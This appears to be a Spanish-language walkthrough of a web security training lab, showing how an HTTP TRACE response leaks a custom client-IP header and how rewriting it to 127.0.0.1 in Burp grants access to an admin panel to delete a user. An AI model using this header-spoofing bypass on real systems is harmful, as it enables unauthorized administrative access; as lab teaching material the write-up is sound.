# 4 - Authentication bypass

> This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.
>
>  To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account.
>
>  You can log in to your own account using the following credentials: `wiener:peter`

Si hacemos GET /admin vemos como esta solo accesible para los admins o para las ip locales.

Si usamos el HTTP **TRACE** obtenemos lo siguiente:

![](../../.gitbook/assets/imagen%20%28627%29.png)

```http
HTTP/1.1 200 OK
Content-Type: message/http
Connection: close
Content-Length: 853

TRACE /admin HTTP/1.1
Host: ac181f001e186d2d80062eab00b30088.web-security-academy.net
Cookie: session=nieLM2KCUFO2iEbBtR4jR8Es7NretfAS
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Sec-Ch-Ua-Mobile: ?0
Referer: https://ac181f001e186d2d80062eab00b30088.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9
Connection: close
X-Custom-IP-Authorization: 186.54.60.157
```

Ver esa **x-custom-ip** tiene nuestra IP. Es usada para determinar que nuestra request viene de una red local o publica.

Vamos a "Proxy" &gt; "Options" &gt; "Match and Replace" y le damos add. No hay condicion de match pero en replace hacemos `X-Custom-IP-Authorization: 127.0.0.1` listo en este header estamos en una red interna

 Entramos a la zona de admins y borramos a carlos.









![](../../.gitbook/assets/imagen%20%28629%29.png)

